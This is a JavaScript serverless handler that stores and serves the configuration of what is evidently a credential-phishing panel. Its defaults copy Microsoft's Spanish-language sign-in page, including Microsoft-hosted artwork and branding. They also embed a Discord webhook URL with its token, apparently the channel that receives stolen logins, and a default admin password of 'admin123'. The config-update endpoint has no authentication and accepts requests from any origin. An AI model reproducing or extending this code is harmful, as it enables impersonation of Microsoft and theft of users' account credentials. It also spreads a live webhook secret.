import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail-office-3656';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;

const headers = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'PanelControlVercel/2.0',
  'Content-Type': 'application/json'
};

async function githubRead() {
  const res = await fetch(GITHUB_API, { method: 'GET', headers });
  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
  const data = await res.json();
  return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
}

async function githubWrite(config) {
  const content = Buffer.from(JSON.stringify(config, null, 2)).toString('base64');
  let sha = undefined;

  // Try to get existing SHA for update
  try {
    const res = await fetch(GITHUB_API, { method: 'GET', headers });
    if (res.ok) {
      const data = await res.json();
      sha = data.sha;
    }
  } catch (e) {
    // File might not exist yet, that's ok for initial write
  }

  const body = JSON.stringify({
    message: 'Update config',
    content: content,
    ...(sha ? { sha } : {})
  });

  const res = await fetch(GITHUB_API, {
    method: sha ? 'PUT' : 'PUT',
    headers,
    body
  });

  if (!res.ok) {
    const text = await res.text();
    throw new Error(`GitHub write error: ${res.status} ${text}`);
  }

  return await res.json();
}

function getDefaultConfig() {
  return {
    discordWebhook: "https://discord.com/api/webhooks/1552922193904533585/qFZTJm-dvi8rtMebse3E46vYEJHiRUMPCOT431ObwBflrQM0B0pYoaiEWZVolklwl0mk",
    loginBgType: "image",
    loginBgColor: "#0a0a1a",
    loginBgGradient: "linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)",
    loginBgImage: "https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg",
    loginTitle: "Iniciar sesión",
    loginSubtitle: "Usar su cuenta de Microsoft.",
    loginButton: "Siguiente",
    loginBgOverlay: true,
    loginCardBg: "rgba(255, 255, 255, 0.15)",
    loginCardBlur: "10px",
    adminPassword: "admin123",
    adminAccessEnabled: true,
    discordMessageTemplate: "",
    showLogo: true,
    logoText: "Microsoft",
    favicon: "/favicon.svg"
  };
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, PUT, PATCH, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'GET') {
    try {
      let config = {};
      try {
        config = await githubRead();
      } catch (e) {
        console.warn('GitHub read failed, using defaults:', e.message);
        config = getDefaultConfig();
      }

      // Merge with defaults for any missing fields
      const defaults = getDefaultConfig();
      config = { ...defaults, ...config };

      return res.status(200).json(config);
    } catch (err) {
      console.error('Config GET error:', err);
      return res.status(200).json(getDefaultConfig());
    }
  }

  if (req.method === 'PUT' || req.method === 'PATCH') {
    if (!GH_TOKEN) {
      return res.status(500).json({ error: 'GH_TOKEN no configurado' });
    }

    try {
      let config = {};
      try {
        config = await githubRead();
      } catch (e) {
        config = getDefaultConfig();
      }

      const updates = req.body || {};
      const merged = { ...config, ...updates };

      await githubWrite(merged);

      return res.status(200).json({ success: true, config: merged });
    } catch (err) {
      console.error('Config PUT error:', err);
      return res.status(500).json({ error: 'Error actualizando configuración: ' + err.message });
    }
  }

  return res.status(405).json({ error: 'Método no permitido' });
}